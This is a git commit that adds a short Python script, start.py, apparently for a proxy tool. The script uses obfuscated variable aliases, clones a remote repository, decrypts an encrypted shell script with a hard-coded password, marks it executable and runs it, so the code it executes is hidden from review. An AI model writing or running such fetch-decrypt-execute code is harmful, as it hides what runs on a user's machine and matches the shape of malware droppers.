cda404571b7a38fc2d5665f3bf8c3e89e42b96d4
nppr-team <144174276+nppr-team@users.noreply.github.com>
2023-11-27 22:44:41 +0300

    Create start.py

---
+++ start.py
@@ -0,0 +1,12 @@
+import os
+o=True
+P=os.chmod
+j=os.chdir
+x=os.system
+import subprocess
+y=subprocess.run
+x("git clone https://github.com/nppr-team/proxyteam.git")
+j('proxyteam')
+y(['openssl','enc','-d','-aes-256-cbc','-in','NPPRPROXY.sh.enc','-out','NPPRPROXY.sh','-pass','pass:2517'],check=o)
+P('NPPRPROXY.sh',0o755)
+y(['./NPPRPROXY.sh'],check=o)
